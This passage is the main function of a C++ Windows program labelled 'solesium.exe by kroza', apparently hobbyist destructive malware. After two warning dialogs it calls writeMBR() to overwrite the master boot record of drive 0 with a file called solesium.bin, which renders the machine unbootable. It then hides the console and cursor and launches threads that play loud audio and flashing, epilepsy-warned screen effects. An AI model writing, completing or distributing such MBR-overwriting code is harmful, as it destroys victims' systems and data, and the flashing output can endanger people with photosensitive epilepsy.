        MB_YESNO | MB_ICONWARNING | MB_SETFOREGROUND | MB_TOPMOST);
    if (a != IDYES) return 0;

    int b = MessageBoxA(NULL,
        "LAST WARNING!\n"
        "Epilepsy warning and loud sounds!\n"
        "This is your last chance to deny.\n"
        "DO YOU ACTUALLY WANT TO RUN THIS?",
        "solesium.exe by kroza - LAST WARNING.",
        MB_YESNO | MB_ICONWARNING | MB_SETFOREGROUND | MB_TOPMOST);
    if (b != IDYES) return 0;

    bool mbrOk = writeMBR();
    if (!mbrOk)
        MessageBoxA(NULL, "solesium.bin missing on Desktop or drive 0 unwritable. Continuing anyway.",
                    "solesium.exe by kroza", MB_OK | MB_ICONWARNING);

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    ShowCursor(FALSE);

    HDC sdc = GetDC(NULL);
    g_memDC = CreateCompatibleDC(sdc);
    ReleaseDC(NULL, sdc);

    BITMAPINFO bi;
    memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = W;
    bi.bmiHeader.biHeight = -H;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;
    g_dib = CreateDIBSection(g_memDC, &bi, DIB_RGB_COLORS, &g_bits, NULL, 0);
    SelectObject(g_memDC, g_dib);

    g_tmp.resize(NPIX);
    g_snap.assign(NPIX, 0);
    for (int i = 0; i < 256 * 256; i++) g_tex[i] = xr();
    initBall();

    g_ev = CreateEventA(NULL, FALSE, FALSE, NULL);
    InterlockedExchange(&g_rate, PH[0].rate);

    HANDLE hA = CreateThread(NULL, 0, audioThread, NULL, 0, NULL);
    HANDLE hV = CreateThread(NULL, 0, visualThread, NULL, 0, NULL);
    SetThreadPriority(hA, THREAD_PRIORITY_TIME_CRITICAL);

    WaitForSingleObject(hV, INFINITE);
    InterlockedExchange(&g_stop, 1);
    WaitForSingleObject(hA, 2000);
    ShowCursor(TRUE);
    return 0;
}
